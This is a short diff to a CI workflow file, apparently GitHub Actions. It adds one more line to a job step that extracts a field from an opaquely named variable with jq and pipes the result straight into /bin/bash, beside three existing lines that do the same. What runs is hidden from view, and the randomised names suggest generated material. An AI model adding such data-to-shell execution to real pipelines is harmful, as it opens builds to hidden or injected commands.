@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$vn1805" | jq -r .jst73224 | /bin/bash
           printf '%s' "$k701" | jq -r .tjijp9 | /bin/bash
           printf '%s' "$kyukg33481" | jq -r .kimjg5995 | /bin/bash
+          echo $f9737 | jq -r .t05 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
